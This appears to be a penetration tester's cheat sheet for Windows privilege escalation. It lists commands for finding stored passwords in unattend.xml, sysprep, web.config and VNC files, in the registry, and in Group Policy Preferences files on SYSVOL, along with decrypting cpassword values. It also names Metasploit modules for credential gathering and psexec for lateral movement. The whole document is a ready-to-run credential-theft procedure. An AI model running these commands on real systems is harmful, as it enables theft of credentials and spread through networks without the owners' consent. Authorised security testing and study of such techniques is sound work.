-------------------------------------------------------------------------------
# find the full path for the important files

C:\> dir /b /s unattend.xml
C:\> dir /b /s web.config
C:\> dir /b /s sysprep.inf
C:\> dir /b /s sysprep.xml
C:\> dir /b /s *pass*
C:\> dir /b /s vnc.ini


-------------------------------------------------------------------------------
# find the keyword "password" in all files
findstr /spin "password" *.*

# discover files that contain the keyword "password" in the following extensions
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

# Metasploit module to discover credentials via unattended installations
post/windows/gather/enum_unattend

-------------------------------------------------------------------------------
# find passwords stored in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

-------------------------------------------------------------------------------

# GPP
# check for ip address of domain controller
nslookup nameofserver.whatever.local

# now mount it
net use z: \\<DC IP address>\SYSVOL

# go to z: drive
z:

# search for Groups.xml files
dir Groups.xml /s

# search for all .xml files for keyword "cpassword"
findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml

# decrypt the password found
gpp-decrypt <pass>

# Metasploit module
post/windows/gather/credentials/gpp
# after credentials are found, use Psexec module
exploit/windows/smb/psexec

-------------------------------------------------------------------------------


# meterpreter
post/windows/gather/credentials/gpp
post/windows/gather/enum_unattend
